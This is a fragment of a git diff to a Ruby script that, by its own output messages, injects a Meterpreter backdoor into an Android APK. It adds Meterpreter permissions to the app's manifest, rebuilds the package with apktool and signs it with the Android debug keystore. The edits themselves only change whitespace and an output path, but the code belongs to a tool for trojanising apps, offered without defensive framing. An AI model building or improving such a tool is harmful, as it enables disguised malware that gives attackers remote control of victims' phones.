@@ -89,8 +89,8 @@ def fix_manifest()
 	}
 	original_permissions=[]
 	apk_mani=''
-
-	#Load original apk's permissions
+        
+        #Load original apk's permissions
 	File.open("output/original/AndroidManifest.xml","r"){|file2|
 		k=File.read(file2)
 		apk_mani=k
@@ -203,7 +203,7 @@ print "[*] Poisoning the manifest with meterpreter permissions..\n"
 fix_manifest()
 
 print "[*] Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n"
-`apktool b -o output/#{injected_apk} output/original`
+`apktool b -o #{injected_apk} output/original`
 print "[*] Signing #{injected_apk} ..\n"
 `jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{injected_apk} androiddebugkey`
 
